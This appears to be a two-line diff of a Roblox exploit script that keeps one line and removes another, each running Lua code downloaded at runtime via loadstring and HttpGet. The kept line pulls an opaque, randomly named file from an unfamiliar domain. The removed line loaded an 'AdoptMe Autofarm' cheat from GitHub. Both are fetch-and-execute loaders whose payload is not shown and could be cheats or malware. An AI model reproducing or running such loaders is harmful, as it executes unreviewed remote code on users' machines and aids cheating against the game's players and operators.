@@ -1,3 +1,2 @@
 loadstring(game:HttpGet("https://egorikusa.space/0e0e9b5408d0d5d0fbb20728.lua", true))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/boygamer1/AdoptMe/refs/heads/main/Autofarm", true))()
